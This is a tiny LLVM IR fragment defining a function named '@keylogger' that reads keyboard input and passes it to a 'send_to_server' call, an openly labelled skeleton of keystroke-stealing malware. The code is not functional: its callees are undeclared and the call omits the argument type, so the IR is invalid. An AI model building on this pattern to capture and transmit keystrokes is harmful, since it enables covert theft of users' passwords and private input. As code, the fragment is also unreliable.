define void @keylogger() {
entry:
  %0 = call i32 @read_keyboard()
  call void @send_to_server(%0)
  ret void
}
